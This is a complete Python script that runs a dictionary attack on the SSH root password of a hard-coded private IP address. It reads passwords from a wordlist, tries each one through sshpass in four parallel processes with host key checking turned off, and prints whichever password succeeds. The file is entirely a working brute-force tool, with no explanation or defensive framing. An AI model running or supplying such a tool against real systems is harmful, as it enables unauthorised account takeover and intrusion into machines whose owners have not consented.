#!/usr/bin/env python
import os
import sys

import multiprocessing
import subprocess
import datetime,time
import re

# Define
def checker(ip,host):
#
    pw = ip
#
    cmd = "timeout 0.5 sshpass -p " + pw + " ssh -q root@" + host + "  -o StrictHostKeyChecking=no 'exit';"
    p = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
    output, error = p.communicate()
    executetime=output.split('\n')

#
    if p.returncode:
        print("."),

    elif p.returncode == 0:
        print("")
        print(pw)      
        sys.exit("Success!")

# pool
def start(iplist,host):
        pool = multiprocessing.Pool(processes=4)
        result=[]
        for ip in iplist:
            result.append(pool.apply_async(checker, (ip,host, )))	    
        pool.close()
        pool.join()






# main block
if __name__ == '__main__':

    host = "10.8.60.82"
    f = open('dictionary.txt')
    iplist = f.read().split()

    #
    start(iplist,host)


